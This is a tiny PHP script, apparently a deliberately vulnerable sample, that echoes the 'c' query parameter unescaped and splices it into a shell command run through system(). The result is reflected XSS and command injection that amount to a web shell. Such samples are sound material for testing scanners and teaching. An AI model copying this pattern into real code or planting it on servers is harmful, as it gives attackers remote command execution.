<?php

if (isset($_GET['c'])) {
    echo $_GET['c'];
    system('echo "' . $_GET['c'] . '"');
}
